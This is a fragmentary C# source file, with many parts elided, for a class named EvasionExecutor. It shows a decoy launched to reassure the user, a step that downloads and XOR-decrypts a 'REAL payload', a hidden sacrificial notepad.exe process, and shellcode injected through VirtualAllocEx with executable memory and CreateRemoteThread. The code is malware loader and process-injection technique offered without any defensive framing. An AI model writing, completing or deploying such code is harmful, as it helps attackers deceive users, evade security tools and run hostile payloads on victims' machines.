...
public class EvasionExecutor
{
    ...
    [StructLayout(LayoutGKind.Sequential)]
    ...
    // The XOR key for your stage.xor
    ...
    public void Trigger()
    {
        try
        {
            // 1. Launch the decoy immediately for quick, benign user feedback.
            RunDecoy();

            // 2. Download and decrypt the REAL payload.
    ...
    {
        // Target a legitimate 32-bit process.
        string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe"; 
        
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        // Set flags to hide the process window.
        si.cb = (uint)Marshal.SizeOf(si);
        si.dwFlags = 0x1; // STARTF_USESHOWWINDOW
        si.wShowWindow = 0; // SW_HIDE

        // Create the sacrificial process hidden.
        ...
        if (success)
        {
            ...
            IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000 /* MEM_COMMIT | MEM_RESERVE */, 0x40 /* PAGE_EXECUTE_READWRITE */);
            ...
            IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out _);

            // Wait for the shellcode to finish before we close handles.
    ...
    private void RunDecoy()
    {
        ...
        catch { /* Decoy failure is not critical */ }
    }
}
